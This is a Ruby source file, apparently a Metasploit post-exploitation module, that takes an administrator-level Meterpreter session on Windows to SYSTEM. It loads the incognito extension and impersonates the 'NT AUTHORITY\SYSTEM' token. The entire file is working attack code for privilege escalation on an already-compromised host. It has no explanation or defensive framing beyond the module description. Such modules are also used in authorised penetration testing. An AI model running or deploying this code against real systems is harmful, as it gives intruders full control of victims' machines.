##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate Get System via Administrator using impersonate_token command.',
      'Description'   => %q{
          This module uses the 'impersonate_token' command of incognito
        extension to escalate the current session to the SYSTEM account 
        from an administrator user account.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'wo4haoren',
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

  end

  def unsupported
    print_error("This platform is not supported with this script!")
    raise Rex::Script::Completed
  end

  def run

    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)

    if is_system?
      print_good("This session already has SYSTEM privileges")
      return
    end

    begin
        print_good("Loading incognito... ")
        client.core.use("incognito")
        print_good("Try to impersonate SYSTEM token...")
        client.incognito.incognito_impersonate_token('NT AUTHORITY\SYSTEM').each_line { |string|
                print(string)
        }
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to obtain SYSTEM access")
    end
  end
end